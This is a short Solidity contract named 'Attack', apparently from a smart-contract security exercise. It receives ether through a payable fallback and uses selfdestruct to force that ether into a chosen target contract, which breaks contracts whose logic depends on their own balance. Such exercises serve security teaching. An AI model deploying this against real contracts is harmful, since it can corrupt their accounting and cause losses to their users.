pragma solidity ^0.7.0;

contract Attack {
  // selfdestruct contract and send remaining ether in this contract to beneficiary (which is another contract address)
  function destruct(address payable beneficiary) public {
    selfdestruct(beneficiary);
  }

  // get balance of contract
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }

  fallback() external payable {

  }
}